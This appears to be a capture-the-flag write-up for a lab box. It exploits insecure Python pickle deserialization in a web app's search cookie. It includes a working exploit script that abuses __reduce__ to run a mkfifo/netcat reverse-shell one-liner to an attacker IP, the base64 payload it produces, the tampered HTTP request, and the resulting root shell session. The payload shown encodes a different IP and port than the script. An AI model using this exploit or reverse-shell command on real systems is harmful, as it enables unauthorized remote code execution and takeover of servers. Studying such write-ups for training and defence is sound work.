# Pickle RCE In Cookie

Intercepting all requests in BurpSuite leads to understanding that there is a pickle stored in the `search_cookie`:

```
HTTP/1.1 200 OK
Date: Sat, 05 Jun 2021 05:59:09 GMT
Server: WSGIServer/0.2 CPython/3.8.6
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 5878
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  search_cookie="gASVCQAAAAAAAACMBWFwcGxllC4="; Path=/
Set-Cookie:  csrftoken=UUD6QtcPz63MKhSdQJgK91xyDjsWUxWIrN8wR9LOLwJffuO3EQzY5Ul2kkccId2f; expires=Sat, 04 Jun 2022 05:59:09 GMT; Max-Age=31449600; Path=/; SameSite=Lax
```

Decode Script of pickle&#x20;

```
import pickle                                                                  
import base64                                                                  
s = "gASVCQAAAAAAAACMBWFwcGxllC4="                                             
base64.b64decode(s)                       
pickle.loads(base64.b64decode(s))

```

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Exploit Script To RCE

```
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

Running the script gives me the following base64 encoded pickle:

```
$ python3 makepickle.py 
b'gASVaAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE1ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjUwLjcyIDQ0NDQgPi90bXAvZpSFlFKULg=='
```

Now, intercept the request in BurpSuite and modify the value of the `search_cookie`:

```
POST /search HTTP/1.1
Host: 10.10.101.128:5003
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.101.128:5003/search
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://10.10.101.128:5003
Connection: close
Cookie: csrftoken=UUD6QtcPz63MKhSdQJgK91xyDjsWUxWIrN8wR9LOLwJffuO3EQzY5Ul2kkccId2f; search_cookie="gASVaAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE1ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjUwLjcyIDQ0NDQgPi90bXAvZpSFlFKULg=="
Upgrade-Insecure-Requests: 1

csrfmiddlewaretoken=bU0PAWeQasy8PgUEVezIo4poKG4QSGq0INvfBCNPmSeBktQuJlSWkXdSrHO6Gmwx&query=apple
```

Now we have a reverse shell. We are `root` but there is no flag in the `/root` directory, and it seems that we are running in a docker environment:

```
┌──(kali㉿kali)-[/data/tryhackme/Unbaked_Pie/files]
└─$ nc -nlvp 4444         
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.101.128] 36542
/bin/sh: 0: can't access tty; job control turned off
# python3 -c "import pty;pty.spawn('/bin/bash')"
root@8b39a559b296:/home# id
id
uid=0(root) gid=0(root) groups=0(root)
root@8b39a559b296:/home# cd /root
cd /root
root@8b39a559b296:~# ll
ll
bash: ll: command not found
root@8b39a559b296:~# ls -la
ls -la
total 36
drwx------ 1 root root 4096 Oct  3  2020 .
drwxr-xr-x 1 root root 4096 Oct  3  2020 ..
-rw------- 1 root root  889 Oct  6  2020 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 Oct  3  2020 .cache
drwxr-xr-x 3 root root 4096 Oct  3  2020 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw------- 1 root root    0 Sep 24  2020 .python_history
drwx------ 2 root root 4096 Oct  3  2020 .ssh
-rw-r--r-- 1 root root  254 Oct  3  2020 .wget-hsts
```

